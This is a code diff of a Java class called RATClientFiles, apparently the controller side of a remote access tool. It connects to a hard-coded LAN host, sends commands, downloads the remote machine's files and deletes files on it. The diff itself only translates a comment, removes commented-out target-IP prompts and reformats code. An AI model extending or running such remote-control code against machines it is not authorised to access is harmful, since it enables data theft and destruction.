@@ -3,20 +3,12 @@ import java.net.Socket;
 import java.util.Scanner;
 
 public class RATClientFiles {
-    // pfad zum download (anpassen wenn nötig)
+    // Path for download (adjust if necessary)
     private static final String DOWNLOAD_DIR = "C:\\Users\\victo\\Downloads\\";
 
     public static void main(String[] args) {
         try (Scanner scanner = new Scanner(System.in);
-			//String target_ip = 192.168.178.69;
-			//String target_port = 8080;
-			//System.out.println("Select a ip for the target, or press enter to use the standard ip. Standard ip = " + target_ip);
-			//String target_ip = scanner.nextLine();
-			//System.out.println("Select the Port used or press enter to use the standard port. Standard Port = " + target_port);
-			// check if new input is give, how?
-			//String target_ip = scanner.nextLine();
              Socket socket = new Socket("192.168.178.37", 8080);
-  			 // Socket socket = new Socket(target_ip, target_port);
              DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
              DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()))) {
             System.out.println("Connected to Server at: '" + socket.getInetAddress().getHostAddress() + "' Enter a command:");
@@ -40,12 +32,11 @@ public class RATClientFiles {
                     out.writeUTF(filePath);
                     out.flush();
                     receiveFile(in, DOWNLOAD_DIR + fileName);
-                }
-                else if (command.startsWith("DELETE")) {
-                String filePath = command.substring("DELETE ".length());
-                out.writeUTF("DELETE");
-                out.writeUTF(filePath);
-                out.flush();
+                } else if (command.startsWith("DELETE")) {
+                    String filePath = command.substring("DELETE ".length());
+                    out.writeUTF("DELETE");
+                    out.writeUTF(filePath);
+                    out.flush();
                     String serverResponse;
                     while (true) {
                         serverResponse = in.readUTF();
@@ -53,7 +44,7 @@ public class RATClientFiles {
                             break;
                         }
                         System.out.println(serverResponse);
-                    }                
+                    }
                 } else {
                     out.writeUTF(command);
                     out.flush();
@@ -113,7 +104,7 @@ public class RATClientFiles {
                 byte[] buffer = new byte[4096];
                 int read;
                 long totalRead = 0;
-                while (totalRead < fileSize && (read = in.read(buffer, 0, Math.min(buffer.length, (int)(fileSize - totalRead)))) != -1) {
+                while (totalRead < fileSize && (read = in.read(buffer, 0, Math.min(buffer.length, (int) (fileSize - totalRead)))) != -1) {
                     fos.write(buffer, 0, read);
                     totalRead += read;
                 }
